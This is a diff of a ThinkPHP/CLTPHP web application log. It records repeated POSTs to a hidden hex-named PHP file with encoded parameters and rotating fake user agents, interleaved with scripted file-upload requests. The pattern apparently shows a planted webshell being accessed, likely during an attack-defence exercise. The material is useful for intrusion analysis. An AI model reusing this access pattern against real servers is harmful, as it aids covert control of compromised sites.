+[ sql ] [ SQL ] SELECT * FROM `clt_wx_key_replay` WHERE  `instance_id` = 0  AND `key` = ''  AND `match_type` = 2 LIMIT 1 [ RunTime:0.000211s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_key_replay` WHERE  `instance_id` = 0  AND `key` LIKE '%%'  AND `match_type` = 1 LIMIT 1 [ RunTime:0.000234s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_media` WHERE  `media_id` = 2 LIMIT 1 [ RunTime:0.000170s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_media_item` WHERE  `media_id` = 2 [ RunTime:0.000163s ]
+---------------------------------------------------------------
+[ 2018-07-05T23:46:37+08:00 ] 172.17.0.1 POST //.928e14c9854929ed80a1be176de90b9b.php
+[ info ] 127.0.0.1:80//.928e14c9854929ed80a1be176de90b9b.php [运行时间：0.047761s][吞吐率：20.94req/s] [内存消耗：303.51kb] [文件加载：33]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '.928e14c9854929ed80a1be176de90b9b.php',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1:80',
+  'accept-encoding' => 'identity',
+  'content-length' => '75',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'user-agent' => 'ELinks/0.9.3 (textmode; Linux 2.6.9-kanotix-8 i686; 127x41)',
+)
+[ info ] [ PARAM ] array (
+  'a' => 'p3ymqTIg',
+  'b' => 'MJAbolObMJkfZSpjpwSxBj==',
+  'hash' => '9b0910f56ed3b758c7f382ae2fe7b52f',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-07-05T23:46:37+08:00 ] 172.17.0.1 POST /index.php/user/upFiles/upload
+[ info ] 127.0.0.1/index.php/user/upFiles/upload [运行时间：0.053412s][吞吐率：18.72req/s] [内存消耗：601.62kb] [文件加载：48]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'user',
+    1 => 'upFiles',
+    2 => 'upload',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1',
+  'connection' => 'keep-alive',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'user-agent' => 'python-requests/2.18.4',
+  'x-requested-with' => 'XMLHttpRequest',
+  'content-length' => '175',
+  'content-type' => 'multipart/form-data; boundary=9dac8bacb47a4f2ca34e28edaff30b33',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\user\controller\UpFiles->upload[ /var/www/html/app/user/controller/UpFiles.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000454s ] mysql:host=127.0.0.1;port=3306;dbname=cltphp51_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_users` [ RunTime:0.000948s ]
+[ sql ] [ SQL ] SELECT `u`.*,`ul`.`level_name` FROM `clt_users` `u` LEFT JOIN `clt_user_level` `ul` ON `u`.`level`=`ul`.`level_id` WHERE  `u`.`id` IS NULL LIMIT 1 [ RunTime:0.000438s ]
+---------------------------------------------------------------
+[ 2018-07-05T23:51:31+08:00 ] 172.17.0.1 POST //.928e14c9854929ed80a1be176de90b9b.php
+[ info ] 127.0.0.1:80//.928e14c9854929ed80a1be176de90b9b.php [运行时间：0.037564s][吞吐率：26.62req/s] [内存消耗：303.70kb] [文件加载：33]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '.928e14c9854929ed80a1be176de90b9b.php',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1:80',
+  'accept-encoding' => 'identity',
+  'content-length' => '75',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7',
+)
+[ info ] [ PARAM ] array (
+  'a' => 'p3ymqTIg',
+  'b' => 'MJAbolObMJkfZSpjpwSxBj==',
+  'hash' => '9b0910f56ed3b758c7f382ae2fe7b52f',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-07-05T23:51:31+08:00 ] 172.17.0.1 POST /index.php/user/upFiles/upload
+[ info ] 127.0.0.1/index.php/user/upFiles/upload [运行时间：0.059458s][吞吐率：16.82req/s] [内存消耗：596.98kb] [文件加载：48]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'user',
+    1 => 'upFiles',
+    2 => 'upload',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1',
+  'connection' => 'keep-alive',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'user-agent' => 'python-requests/2.18.4',
+  'x-requested-with' => 'XMLHttpRequest',
+  'content-length' => '176',
+  'content-type' => 'multipart/form-data; boundary=3602b2803d804e5aaabcfa6c61af5eff',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\user\controller\UpFiles->upload[ /var/www/html/app/user/controller/UpFiles.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000410s ] mysql:host=127.0.0.1;port=3306;dbname=cltphp51_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_users` [ RunTime:0.000664s ]
+[ sql ] [ SQL ] SELECT `u`.*,`ul`.`level_name` FROM `clt_users` `u` LEFT JOIN `clt_user_level` `ul` ON `u`.`level`=`ul`.`level_id` WHERE  `u`.`id` IS NULL LIMIT 1 [ RunTime:0.000283s ]
+---------------------------------------------------------------
+[ 2018-07-05T23:51:58+08:00 ] 172.17.0.1 POST //.928e14c9854929ed80a1be176de90b9b.php
+[ info ] 127.0.0.1:80//.928e14c9854929ed80a1be176de90b9b.php [运行时间：0.051855s][吞吐率：19.28req/s] [内存消耗：303.80kb] [文件加载：33]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '.928e14c9854929ed80a1be176de90b9b.php',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1:80',
+  'accept-encoding' => 'identity',
+  'content-length' => '75',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-us) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
+)
+[ info ] [ PARAM ] array (
+  'a' => 'p3ymqTIg',
+  'b' => 'MJAbolObMJkfZSpjpwSxBj==',
+  'hash' => '9b0910f56ed3b758c7f382ae2fe7b52f',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-07-05T23:51:58+08:00 ] 172.17.0.1 POST /index.php/user/upFiles/upload
+[ info ] 127.0.0.1/index.php/user/upFiles/upload [运行时间：0.064407s][吞吐率：15.53req/s] [内存消耗：596.98kb] [文件加载：48]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'user',
+    1 => 'upFiles',
+    2 => 'upload',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1',
+  'connection' => 'keep-alive',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'user-agent' => 'python-requests/2.18.4',
+  'x-requested-with' => 'XMLHttpRequest',
+  'content-length' => '176',
+  'content-type' => 'multipart/form-data; boundary=b96b1a5c9a0d4ec78bc4a5bf4ccb6c5e',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\user\controller\UpFiles->upload[ /var/www/html/app/user/controller/UpFiles.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000338s ] mysql:host=127.0.0.1;port=3306;dbname=cltphp51_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_users` [ RunTime:0.000681s ]
+[ sql ] [ SQL ] SELECT `u`.*,`ul`.`level_name` FROM `clt_users` `u` LEFT JOIN `clt_user_level` `ul` ON `u`.`level`=`ul`.`level_id` WHERE  `u`.`id` IS NULL LIMIT 1 [ RunTime:0.000467s ]
+---------------------------------------------------------------
+[ 2018-07-05T23:52:13+08:00 ] 172.17.0.1 POST //.928e14c9854929ed80a1be176de90b9b.php
+[ info ] 127.0.0.1:80//.928e14c9854929ed80a1be176de90b9b.php [运行时间：0.044631s][吞吐率：22.41req/s] [内存消耗：303.84kb] [文件加载：33]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '.928e14c9854929ed80a1be176de90b9b.php',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1:80',
+  'accept-encoding' => 'identity',
+  'content-length' => '75',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A346 Safari/602.1',
+)
+[ info ] [ PARAM ] array (
+  'a' => 'p3ymqTIg',
+  'b' => 'MJAbolObMJkfZSpjpwSxBj==',
+  'hash' => '9b0910f56ed3b758c7f382ae2fe7b52f',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-07-05T23:52:13+08:00 ] 172.17.0.1 POST /index.php/user/upFiles/upload
+[ info ] 127.0.0.1/index.php/user/upFiles/upload [运行时间：0.085939s][吞吐率：11.64req/s] [内存消耗：596.98kb] [文件加载：48]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'user',
+    1 => 'upFiles',
+    2 => 'upload',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1',
+  'connection' => 'keep-alive',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'user-agent' => 'python-requests/2.18.4',
+  'x-requested-with' => 'XMLHttpRequest',
+  'content-length' => '176',
+  'content-type' => 'multipart/form-data; boundary=1e541852a33247bfa68f15e3f04e7ca9',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\user\controller\UpFiles->upload[ /var/www/html/app/user/controller/UpFiles.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.001409s ] mysql:host=127.0.0.1;port=3306;dbname=cltphp51_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_users` [ RunTime:0.001131s ]
+[ sql ] [ SQL ] SELECT `u`.*,`ul`.`level_name` FROM `clt_users` `u` LEFT JOIN `clt_user_level` `ul` ON `u`.`level`=`ul`.`level_id` WHERE  `u`.`id` IS NULL LIMIT 1 [ RunTime:0.000396s ]
+---------------------------------------------------------------
+[ 2018-07-05T23:52:15+08:00 ] 172.17.0.1 POST //.928e14c9854929ed80a1be176de90b9b.php
+[ info ] 127.0.0.1:80//.928e14c9854929ed80a1be176de90b9b.php [运行时间：0.036669s][吞吐率：27.27req/s] [内存消耗：303.64kb] [文件加载：33]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '.928e14c9854929ed80a1be176de90b9b.php',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1:80',
+  'accept-encoding' => 'identity',
+  'content-length' => '75',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'user-agent' => 'Mozilla/5.0 (MeeGo; NokiaN9) AppleWebKit/534.13 (KHTML, like Gecko) NokiaBrowser/8.5.0 Mobile Safari/534.13',
+)
+[ info ] [ PARAM ] array (
+  'a' => 'p3ymqTIg',
+  'b' => 'MJAbolObMJkfZSpjpwSxBj==',
+  'hash' => '9b0910f56ed3b758c7f382ae2fe7b52f',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-07-05T23:52:15+08:00 ] 172.17.0.1 POST /index.php/user/upFiles/upload
+[ info ] 127.0.0.1/index.php/user/upFiles/upload [运行时间：0.041152s][吞吐率：24.30req/s] [内存消耗：596.98kb] [文件加载：48]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'user',
+    1 => 'upFiles',
+    2 => 'upload',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1',
+  'connection' => 'keep-alive',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'user-agent' => 'python-requests/2.18.4',
+  'x-requested-with' => 'XMLHttpRequest',
+  'content-length' => '176',
+  'content-type' => 'multipart/form-data; boundary=19362bc3b9ad4b639de460b80fec5e2e',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\user\controller\UpFiles->upload[ /var/www/html/app/user/controller/UpFiles.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.001083s ] mysql:host=127.0.0.1;port=3306;dbname=cltphp51_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_users` [ RunTime:0.000667s ]
+[ sql ] [ SQL ] SELECT `u`.*,`ul`.`level_name` FROM `clt_users` `u` LEFT JOIN `clt_user_level` `ul` ON `u`.`level`=`ul`.`level_id` WHERE  `u`.`id` IS NULL LIMIT 1 [ RunTime:0.000242s ]
+---------------------------------------------------------------
+[ 2018-07-05T23:52:17+08:00 ] 172.17.0.1 POST //.928e14c9854929ed80a1be176de90b9b.php
+[ info ] 127.0.0.1:80//.928e14c9854929ed80a1be176de90b9b.php [运行时间：0.030693s][吞吐率：32.58req/s] [内存消耗：303.49kb] [文件加载：33]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '.928e14c9854929ed80a1be176de90b9b.php',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1:80',
+  'accept-encoding' => 'identity',
+  'content-length' => '75',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'user-agent' => 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
+)
+[ info ] [ PARAM ] array (
+  'a' => 'p3ymqTIg',
+  'b' => 'MJAbolObMJkfZSpjpwSxBj==',
+  'hash' => '9b0910f56ed3b758c7f382ae2fe7b52f',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-07-05T23:52:17+08:00 ] 172.17.0.1 POST /index.php/user/upFiles/upload
+[ info ] 127.0.0.1/index.php/user/upFiles/upload [运行时间：0.039143s][吞吐率：25.55req/s] [内存消耗：596.98kb] [文件加载：48]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'user',
+    1 => 'upFiles',
+    2 => 'upload',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1',
+  'connection' => 'keep-alive',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'user-agent' => 'python-requests/2.18.4',
+  'x-requested-with' => 'XMLHttpRequest',
+  'content-length' => '176',
+  'content-type' => 'multipart/form-data; boundary=9cbeccffeb334cfc83c56846aff5142b',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\user\controller\UpFiles->upload[ /var/www/html/app/user/controller/UpFiles.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000441s ] mysql:host=127.0.0.1;port=3306;dbname=cltphp51_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_users` [ RunTime:0.000662s ]
+[ sql ] [ SQL ] SELECT `u`.*,`ul`.`level_name` FROM `clt_users` `u` LEFT JOIN `clt_user_level` `ul` ON `u`.`level`=`ul`.`level_id` WHERE  `u`.`id` IS NULL LIMIT 1 [ RunTime:0.000319s ]
+---------------------------------------------------------------
+[ 2018-07-05T23:52:19+08:00 ] 172.17.0.1 POST //.928e14c9854929ed80a1be176de90b9b.php
+[ info ] 127.0.0.1:80//.928e14c9854929ed80a1be176de90b9b.php [运行时间：0.044684s][吞吐率：22.38req/s] [内存消耗：303.52kb] [文件加载：33]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '.928e14c9854929ed80a1be176de90b9b.php',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1:80',
+  'accept-encoding' => 'identity',
+  'content-length' => '75',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 8.12; MSIEMobile6.0)',
+)
+[ info ] [ PARAM ] array (
+  'a' => 'p3ymqTIg',
+  'b' => 'MJAbolObMJkfZSpjpwSxBj==',
+  'hash' => '9b0910f56ed3b758c7f382ae2fe7b52f',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-07-05T23:52:19+08:00 ] 172.17.0.1 POST /index.php/user/upFiles/upload
+[ info ] 127.0.0.1/index.php/user/upFiles/upload [运行时间：0.033581s][吞吐率：29.78req/s] [内存消耗：596.98kb] [文件加载：48]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'user',
+    1 => 'upFiles',
+    2 => 'upload',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1',
+  'connection' => 'keep-alive',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'user-agent' => 'python-requests/2.18.4',
+  'x-requested-with' => 'XMLHttpRequest',
+  'content-length' => '176',
+  'content-type' => 'multipart/form-data; boundary=9c1ab5d4b2b24ce7914febeab7e67f2c',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\user\controller\UpFiles->upload[ /var/www/html/app/user/controller/UpFiles.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000522s ] mysql:host=127.0.0.1;port=3306;dbname=cltphp51_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_users` [ RunTime:0.000704s ]
+[ sql ] [ SQL ] SELECT `u`.*,`ul`.`level_name` FROM `clt_users` `u` LEFT JOIN `clt_user_level` `ul` ON `u`.`level`=`ul`.`level_id` WHERE  `u`.`id` IS NULL LIMIT 1 [ RunTime:0.000247s ]
+---------------------------------------------------------------
+[ 2018-07-05T23:52:22+08:00 ] 172.17.0.1 POST //.928e14c9854929ed80a1be176de90b9b.php
+[ info ] 127.0.0.1:80//.928e14c9854929ed80a1be176de90b9b.php [运行时间：0.043448s][吞吐率：23.02req/s] [内存消耗：303.60kb] [文件加载：33]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '.928e14c9854929ed80a1be176de90b9b.php',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1:80',
+  'accept-encoding' => 'identity',
+  'content-length' => '75',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'user-agent' => 'Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)',
+)
+[ info ] [ PARAM ] array (
+  'a' => 'p3ymqTIg',
+  'b' => 'MJAbolObMJkfZSpjpwSxBj==',
+  'hash' => '9b0910f56ed3b758c7f382ae2fe7b52f',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-07-05T23:52:22+08:00 ] 172.17.0.1 POST /index.php/user/upFiles/upload
+[ info ] 127.0.0.1/index.php/user/upFiles/upload [运行时间：0.045875s][吞吐率：21.80req/s] [内存消耗：596.98kb] [文件加载：48]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'user',
+    1 => 'upFiles',
+    2 => 'upload',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1',
+  'connection' => 'keep-alive',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'user-agent' => 'python-requests/2.18.4',
+  'x-requested-with' => 'XMLHttpRequest',
+  'content-length' => '176',
+  'content-type' => 'multipart/form-data; boundary=4912276a3f464dc195a478af52024532',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\user\controller\UpFiles->upload[ /var/www/html/app/user/controller/UpFiles.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000483s ] mysql:host=127.0.0.1;port=3306;dbname=cltphp51_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_users` [ RunTime:0.000699s ]
+[ sql ] [ SQL ] SELECT `u`.*,`ul`.`level_name` FROM `clt_users` `u` LEFT JOIN `clt_user_level` `ul` ON `u`.`level`=`ul`.`level_id` WHERE  `u`.`id` IS NULL LIMIT 1 [ RunTime:0.000221s ]
+---------------------------------------------------------------
+[ 2018-07-05T23:52:24+08:00 ] 172.17.0.1 POST //.928e14c9854929ed80a1be176de90b9b.php
+[ info ] 127.0.0.1:80//.928e14c9854929ed80a1be176de90b9b.php [运行时间：0.055640s][吞吐率：17.97req/s] [内存消耗：303.70kb] [文件加载：33]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '.928e14c9854929ed80a1be176de90b9b.php',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1:80',
+  'accept-encoding' => 'identity',
+  'content-length' => '75',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14',
+)
+[ info ] [ PARAM ] array (
+  'a' => 'p3ymqTIg',
+  'b' => 'MJAbolObMJkfZSpjpwSxBj==',
+  'hash' => '9b0910f56ed3b758c7f382ae2fe7b52f',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-07-05T23:52:24+08:00 ] 172.17.0.1 POST /index.php/user/upFiles/upload
+[ info ] 127.0.0.1/index.php/user/upFiles/upload [运行时间：0.147368s][吞吐率：6.79req/s] [内存消耗：596.98kb] [文件加载：48]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'user',
+    1 => 'upFiles',
+    2 => 'upload',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1',
+  'connection' => 'keep-alive',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'user-agent' => 'python-requests/2.18.4',
+  'x-requested-with' => 'XMLHttpRequest',
+  'content-length' => '176',
+  'content-type' => 'multipart/form-data; boundary=100ff92424ed4e59ba96701bc4cda1fb',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\user\controller\UpFiles->upload[ /var/www/html/app/user/controller/UpFiles.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000347s ] mysql:host=127.0.0.1;port=3306;dbname=cltphp51_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_users` [ RunTime:0.001091s ]
+[ sql ] [ SQL ] SELECT `u`.*,`ul`.`level_name` FROM `clt_users` `u` LEFT JOIN `clt_user_level` `ul` ON `u`.`level`=`ul`.`level_id` WHERE  `u`.`id` IS NULL LIMIT 1 [ RunTime:0.000378s ]
+---------------------------------------------------------------
+[ 2018-07-05T23:52:26+08:00 ] 172.17.0.1 POST //.928e14c9854929ed80a1be176de90b9b.php
+[ info ] 127.0.0.1:80//.928e14c9854929ed80a1be176de90b9b.php [运行时间：0.048562s][吞吐率：20.59req/s] [内存消耗：303.61kb] [文件加载：33]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '.928e14c9854929ed80a1be176de90b9b.php',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1:80',
+  'accept-encoding' => 'identity',
+  'content-length' => '75',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'user-agent' => 'Opera/10.61 (J2ME/MIDP; Opera Mini/5.1.21219/19.999; en-US; rv:1.9.3a5) WebKit/534.5 Presto/2.6.30',
+)
+[ info ] [ PARAM ] array (
+  'a' => 'p3ymqTIg',
+  'b' => 'MJAbolObMJkfZSpjpwSxBj==',
+  'hash' => '9b0910f56ed3b758c7f382ae2fe7b52f',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-07-05T23:52:26+08:00 ] 172.17.0.1 POST /index.php/user/upFiles/upload
+[ info ] 127.0.0.1/index.php/user/upFiles/upload [运行时间：0.041016s][吞吐率：24.38req/s] [内存消耗：596.98kb] [文件加载：48]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'user',
+    1 => 'upFiles',
+    2 => 'upload',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1',
+  'connection' => 'keep-alive',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'user-agent' => 'python-requests/2.18.4',
+  'x-requested-with' => 'XMLHttpRequest',
+  'content-length' => '176',
+  'content-type' => 'multipart/form-data; boundary=968e15ad49b34dd395eda74d82b5690e',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\user\controller\UpFiles->upload[ /var/www/html/app/user/controller/UpFiles.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000437s ] mysql:host=127.0.0.1;port=3306;dbname=cltphp51_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_users` [ RunTime:0.000657s ]
+[ sql ] [ SQL ] SELECT `u`.*,`ul`.`level_name` FROM `clt_users` `u` LEFT JOIN `clt_user_level` `ul` ON `u`.`level`=`ul`.`level_id` WHERE  `u`.`id` IS NULL LIMIT 1 [ RunTime:0.000245s ]
+---------------------------------------------------------------
